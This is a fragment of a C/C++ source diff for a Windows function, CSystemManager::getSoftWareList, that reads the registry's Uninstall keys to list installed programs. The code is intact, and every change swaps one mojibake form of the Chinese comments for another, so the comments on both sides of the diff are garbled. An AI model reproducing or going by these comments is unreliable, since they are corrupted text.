-					if( lstrlen(regDisplayName) == 0 || lstrcmp( regBufferValue,"OperatingSystem") == 0 ) //åˆ¤æ–­æ˜¯å¦æ˜¯è¡¥ä¸ä¿¡æ¯ 
+					if( lstrlen(regDisplayName) == 0 || lstrcmp( regBufferValue,"OperatingSystem") == 0 ) //ÅĞ¶ÏÊÇ·ñÊÇ²¹¶¡ĞÅÏ¢ 
 					{
 						continue;
 					}
@@ -1120,7 +1120,7 @@ LPBYTE CSystemManager::getSoftWareList()
 					
 					dwRegSize = MAX_LEG;
 					memset(regInstallDate,0,MAX_LEG);
-					// åˆ¤æ–­æ˜¯å¦èƒ½åœ¨æ³¨å†Œè¡¨ä¸­è·å–åˆ°å®‰è£…æ—¶é—´, å¦å–å­é¡¹åˆ›å»ºæ—¶é—´
+					// ÅĞ¶ÏÊÇ·ñÄÜÔÚ×¢²á±íÖĞ»ñÈ¡µ½°²×°Ê±¼ä, ·ñÈ¡×ÓÏî´´½¨Ê±¼ä
 					if(RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS )
 					{
 						TCHAR Year[5], Month[5], Day[5];
@@ -1144,7 +1144,7 @@ LPBYTE CSystemManager::getSoftWareList()
 					memset(regUninstallString,0,MAX_LEG);
 					RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);
 
-					// ç¼“å†²åŒºå¤ªå°ï¼Œå†é‡æ–°åˆ†é…ä¸‹
+					// »º³åÇøÌ«Ğ¡£¬ÔÙÖØĞÂ·ÖÅäÏÂ
 					dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
 					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
 						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
@@ -1168,7 +1168,7 @@ LPBYTE CSystemManager::getSoftWareList()
 		}
 	}
 	else 
-		return FALSE; //æ‰“å¼€é”®å¤±è´¥
+		return FALSE; //´ò¿ª¼üÊ§°Ü
 	RegCloseKey(hKey);
 
 	if (GetOSVerIs64Bit())
@@ -1192,9 +1192,9 @@ LPBYTE CSystemManager::getSoftWareList()
 						
 						dwRegSize = MAX_LEG;
 						memset(regBufferValue,0,MAX_LEG);
-						// å–ParentKeyNameé”®å€¼,åˆ¤æ–­æ˜¯å¦æ˜¯è¡¥ä¸ä¿¡æ¯, æ˜¯è¡¥ä¸ä¿¡æ¯é”®å€¼ä¸º"OperatingSystem"
+						// È¡ParentKeyName¼üÖµ,ÅĞ¶ÏÊÇ·ñÊÇ²¹¶¡ĞÅÏ¢, ÊÇ²¹¶¡ĞÅÏ¢¼üÖµÎª"OperatingSystem"
 						RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
-						if( lstrlen(regDisplayName) == 0 || lstrcmp( regBufferValue,"OperatingSystem") == 0 ) //åˆ¤æ–­æ˜¯å¦æ˜¯è¡¥ä¸ä¿¡æ¯ 
+						if( lstrlen(regDisplayName) == 0 || lstrcmp( regBufferValue,"OperatingSystem") == 0 ) //ÅĞ¶ÏÊÇ·ñÊÇ²¹¶¡ĞÅÏ¢ 
 						{
 							continue;
 						}
@@ -1209,7 +1209,7 @@ LPBYTE CSystemManager::getSoftWareList()
 						
 						dwRegSize = MAX_LEG;
 						memset(regInstallDate,0,MAX_LEG);
-						// åˆ¤æ–­æ˜¯å¦èƒ½åœ¨æ³¨å†Œè¡¨ä¸­è·å–åˆ°å®‰è£…æ—¶é—´, å¦å–å­é¡¹åˆ›å»ºæ—¶é—´
+						// ÅĞ¶ÏÊÇ·ñÄÜÔÚ×¢²á±íÖĞ»ñÈ¡µ½°²×°Ê±¼ä, ·ñÈ¡×ÓÏî´´½¨Ê±¼ä
 						if(RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS )
 						{
 							TCHAR Year[5], Month[5], Day[5];
@@ -1233,7 +1233,7 @@ LPBYTE CSystemManager::getSoftWareList()
 						memset(regUninstallString,0,MAX_LEG);
 						RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);
 						
-						// ç¼“å†²åŒºå¤ªå°ï¼Œå†é‡æ–°åˆ†é…ä¸‹
+						// »º³åÇøÌ«Ğ¡£¬ÔÙÖØĞÂ·ÖÅäÏÂ
 						dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
 						if (LocalSize(lpBuffer) < (dwOffset + dwLength))
 							lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
@@ -1257,7 +1257,7 @@ LPBYTE CSystemManager::getSoftWareList()
 			}
 		}
 		else 
-			return FALSE; //æ‰“å¼€é”®å¤±è´¥
+			return FALSE; //´ò¿ª¼üÊ§°Ü
 		RegCloseKey(hKey);
 	}
 
